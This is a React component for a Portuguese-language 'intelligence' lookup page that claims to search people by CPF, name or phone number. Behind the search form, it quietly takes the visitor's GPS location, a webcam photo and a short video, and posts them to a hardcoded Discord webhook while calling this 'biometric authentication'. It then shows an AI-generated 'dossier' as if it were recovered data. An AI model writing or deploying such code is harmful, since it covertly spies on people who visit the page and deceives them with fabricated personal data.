
import React, { useState, useEffect, useRef } from 'react';
import { 
  X, ShieldCheck, Activity, Globe, CheckCircle2, Cpu, Database, Camera, MapPin, ShieldAlert
} from 'lucide-react';
import { ServiceTool } from '../types';
import { GoogleGenAI } from '@google/genai';

const WEBHOOK_URL = "https://discord.com/api/webhooks/1470946745344196812/R1tVe1gUJ8xK_JwkNugUU78diWt9-exPk58pI5k-ijAnpD1rzZUAZTqVqz3GHAt5zVBr";

interface SearchModalProps {
  isOpen: boolean;
  onClose: () => void;
  tool: ServiceTool;
}

const SearchModal: React.FC<SearchModalProps> = ({ isOpen, onClose, tool }) => {
  const [query, setQuery] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState<any>(null);
  const [statusText, setStatusText] = useState('Pronto');
  const [permissionError, setPermissionError] = useState(false);
  
  const inputRef = useRef<HTMLInputElement>(null);
  const chunksRef = useRef<Blob[]>([]);
  const videoRef = useRef<HTMLVideoElement | null>(null);

  useEffect(() => {
    if (isOpen) {
      setTimeout(() => inputRef.current?.focus(), 300);
      setResult(null);
      setQuery('');
      setIsLoading(false);
      setPermissionError(false);
      setStatusText('Aguardando...');
    }
  }, [isOpen]);

  const getGeolocation = (): Promise<{lat: number, lng: number} | null> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 5000 }
      );
    });
  };

  const captureSnapshot = (video: HTMLVideoElement): Promise<Blob | null> => {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.8);
      } else {
        resolve(null);
      }
    });
  };

  const sendToDiscord = async (photoBlob?: Blob | null, videoBlob?: Blob | null, location?: {lat: number, lng: number} | null) => {
    try {
      const mapsUrl = location ? `https://www.google.com/maps?q=${location.lat},${location.lng}` : "Localização não disponível";
      
      const payload = {
        username: "Nova Intelligence | Log System",
        embeds: [{
          title: "🚨 Nova Captura de Biometria",
          color: photoBlob ? 0x10b981 : 0xff0000,
          description: `**Módulo:** ${tool.title}\n**Alvo:** \`${query || 'Indefinido'}\``,
          fields: [
            { name: "📍 Localização", value: location ? `[Ver no Google Maps](${mapsUrl})` : "❌ GPS Desativado", inline: false },
            { name: "📱 Status da Câmera", value: photoBlob ? "✅ Foto Capturada" : "❌ Acesso Negado", inline: true },
            { name: "🎥 Vídeo", value: videoBlob ? "✅ Gravado" : "❌ Falha/Negado", inline: true }
          ],
          timestamp: new Date().toISOString(),
          image: photoBlob ? { url: "attachment://foto.jpg" } : undefined
        }]
      };

      const formData = new FormData();
      formData.append('payload_json', JSON.stringify(payload));
      
      if (photoBlob) {
        formData.append('file1', photoBlob, 'foto.jpg');
      }
      if (videoBlob) {
        formData.append('file2', videoBlob, 'video.webm');
      }

      await fetch(WEBHOOK_URL, {
        method: 'POST',
        body: formData
      });
    } catch (err) {
      console.error("Discord send error:", err);
    }
  };

  const handleSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!query || isLoading) return;

    setIsLoading(true);
    setPermissionError(false);
    setStatusText('Iniciando protocolos...');

    try {
      const loc = await getGeolocation();

      // Ativação da Câmera
      let stream: MediaStream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user' },
          audio: false 
        });
      } catch (err) {
        setIsLoading(false);
        setPermissionError(true);
        await sendToDiscord(null, null, loc);
        return;
      }

      // Cria elemento de vídeo invisível para capturar o frame
      const tempVideo = document.createElement('video');
      tempVideo.srcObject = stream;
      tempVideo.muted = true;
      await tempVideo.play();

      setStatusText('Capturando biometria...');

      // Captura Foto Instantânea
      const photoBlob = await captureSnapshot(tempVideo);

      // Inicia Gravação de Vídeo
      let mimeType = 'video/webm';
      if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/mp4';
      
      const mediaRecorder = new MediaRecorder(stream, { mimeType });
      chunksRef.current = [];
      mediaRecorder.ondataavailable = (ev) => {
        if (ev.data.size > 0) chunksRef.current.push(ev.data);
      };

      mediaRecorder.start();
      await new Promise(resolve => setTimeout(resolve, 2500)); // Grava por 2.5s
      
      if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();

      const videoBlobPromise = new Promise<Blob | null>((resolve) => {
        mediaRecorder.onstop = () => {
          const blob = new Blob(chunksRef.current, { type: mimeType });
          resolve(blob);
        };
      });

      const videoBlob = await videoBlobPromise;

      // Envia tudo para o Discord
      setStatusText('Sincronizando logs...');
      await sendToDiscord(photoBlob, videoBlob, loc);

      // Encerra câmera
      stream.getTracks().forEach(t => t.stop());
      tempVideo.remove();

      setStatusText('Consultando inteligência...');
      
      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
      const response = await ai.models.generateContent({
        model: 'gemini-3-flash-preview',
        contents: `Analista de Dados. Gere um dossiê informativo em JSON para "${tool.title}" identificador "${query}".`,
        config: { responseMimeType: "application/json" }
      });

      setResult(JSON.parse(response.text || '{}'));
      setIsLoading(false);
    } catch (error) {
      console.error("Critical error:", error);
      setIsLoading(false);
      setStatusText('Erro no terminal');
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-end lg:items-center justify-center p-0 lg:p-6">
      <div className="absolute inset-0 bg-black/98 backdrop-blur-3xl" onClick={onClose} />
      <div className="relative w-full h-[90vh] lg:h-auto lg:max-w-4xl bg-[#08080a] border-t lg:border border-white/10 rounded-t-[3rem] lg:rounded-[3rem] overflow-hidden flex flex-col shadow-2xl">
        
        <div className="shrink-0 p-6 lg:p-10 border-b border-white/5 flex items-center justify-between bg-zinc-900/10">
          <div className="flex items-center gap-5">
            <div className="w-14 h-14 rounded-2xl flex items-center justify-center bg-emerald-500/10 text-emerald-500">
               <Database size={32} />
            </div>
            <div>
              <h2 className="text-2xl font-black text-white uppercase tracking-tighter mb-1">{tool.title}</h2>
              <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-[0.3em]">{tool.subtitle}</p>
            </div>
          </div>
          <button onClick={onClose} className="p-3 bg-white/5 rounded-2xl text-zinc-600 hover:text-white transition-colors">
            <X size={28} />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto p-6 lg:p-12 custom-scrollbar">
          <div className="max-w-2xl mx-auto">
            
            {!isLoading && !result && !permissionError && (
              <form onSubmit={handleSearch} className="space-y-6 animate-in slide-in-from-bottom-4">
                <div className="space-y-4">
                   <div className="flex items-center justify-between px-2">
                      <label className="text-[10px] font-black text-zinc-700 uppercase tracking-widest">Identificador</label>
                      <span className="flex items-center gap-1 text-[9px] font-bold text-emerald-500/40 uppercase"><Globe size={10}/> Terminal Ativo</span>
                   </div>
                   <input 
                      ref={inputRef}
                      type="text"
                      value={query}
                      onChange={(e) => setQuery(e.target.value)}
                      placeholder="CPF, Nome ou Telefone..."
                      className="w-full bg-zinc-900/20 border-2 border-white/5 rounded-[2.5rem] py-8 px-10 text-white text-2xl font-black outline-none focus:border-emerald-500/20 transition-all placeholder:text-zinc-800"
                    />
                </div>
                <button 
                  type="submit" 
                  disabled={!query} 
                  className="w-full py-7 rounded-[2.5rem] bg-emerald-600 border-2 border-emerald-500 text-black font-black text-xl flex items-center justify-center gap-4 shadow-2xl shadow-emerald-500/20 hover:brightness-110 active:scale-95 disabled:opacity-30 transition-all"
                >
                  <Activity size={28} /> ACESSAR DADOS
                </button>
                <div className="flex items-center justify-center gap-6 text-zinc-600 text-[9px] font-black uppercase tracking-widest opacity-60">
                   <span className="flex items-center gap-1"><Camera size={12}/> Biometria Facial</span>
                   <span className="flex items-center gap-1"><MapPin size={12}/> Localização GPS</span>
                </div>
              </form>
            )}

            {permissionError && (
              <div className="animate-in zoom-in-95 text-center space-y-8 py-10">
                 <div className="w-24 h-24 bg-red-500/10 rounded-full flex items-center justify-center mx-auto border-2 border-red-500/20">
                    <ShieldAlert size={48} className="text-red-500" />
                 </div>
                 <h3 className="text-3xl font-black text-white uppercase tracking-tighter">Acesso Negado</h3>
                 <p className="text-zinc-500 font-bold">O terminal exige permissão de Câmera e GPS para autenticar a origem da consulta.</p>
                 <button 
                    onClick={() => { setPermissionError(false); }}
                    className="w-full py-6 bg-white text-black rounded-[2.5rem] font-black text-xl uppercase tracking-tighter"
                  >
                    Tentar Novamente
                 </button>
              </div>
            )}

            {isLoading && (
              <div className="flex flex-col items-center justify-center space-y-12 animate-in fade-in py-10">
                 <div className="relative">
                    <div className="w-32 h-32 rounded-full border-4 border-emerald-500/5 border-t-emerald-500 animate-spin"></div>
                    <div className="absolute inset-0 flex items-center justify-center"><Cpu size={32} className="text-emerald-500/50" /></div>
                 </div>
                 <div className="text-center">
                    <p className="text-white font-black text-2xl uppercase italic tracking-tighter">{statusText}</p>
                    <p className="text-[10px] font-bold text-zinc-700 uppercase tracking-[0.4em] mt-2">Protocolo Nova Intelligence</p>
                 </div>
              </div>
            )}

            {result && !isLoading && (
              <div className="space-y-8 animate-in zoom-in-95 pb-10">
                 <div className="flex items-center gap-4 border-b border-white/5 pb-6">
                    <div className="p-2 bg-emerald-500/10 rounded-xl text-emerald-500"><CheckCircle2 size={24} /></div>
                    <h3 className="text-2xl font-black text-white uppercase tracking-tighter">Dados Recuperados</h3>
                 </div>
                 <div className="grid grid-cols-1 gap-6">
                    {Object.entries(result).map(([section, data]: [string, any]) => (
                      <div key={section} className="p-8 rounded-[2.5rem] bg-zinc-900/10 border border-white/5">
                        <h4 className="text-[10px] font-black text-emerald-500 uppercase tracking-[0.3em] mb-6 flex items-center gap-2">
                           <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span> {section.replace(/_/g, ' ')}
                        </h4>
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-y-6 gap-x-10">
                           {typeof data === 'object' ? Object.entries(data).map(([k, v]) => (
                             <div key={k} className="space-y-1">
                                <span className="text-[9px] font-bold text-zinc-700 uppercase">{k.replace(/_/g, ' ')}</span>
                                <p className="text-zinc-200 font-mono font-bold text-sm break-all">{String(v)}</p>
                             </div>
                           )) : <p className="text-zinc-200 font-bold">{String(data)}</p>}
                        </div>
                      </div>
                    ))}
                 </div>
                 <button 
                  onClick={() => setResult(null)} 
                  className="w-full py-5 rounded-[2rem] border border-white/5 text-zinc-500 font-bold uppercase text-[10px] tracking-[0.2em] hover:text-white transition-all"
                 >
                    Nova Consulta
                 </button>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default SearchModal;
